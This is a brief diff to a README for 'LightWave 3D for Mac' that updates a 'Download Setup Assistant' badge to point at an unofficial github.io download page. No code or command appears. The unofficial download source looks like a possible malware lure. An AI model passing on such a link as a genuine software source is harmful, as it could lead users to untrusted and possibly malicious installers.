@@ -1,6 +1,6 @@
 # LightWave 3D for Mac
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](lightwave-3d-mac-download.github.io)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://lightwave-3d-mac-download.github.io/.github)
 
 ## 📦 How to Install
 
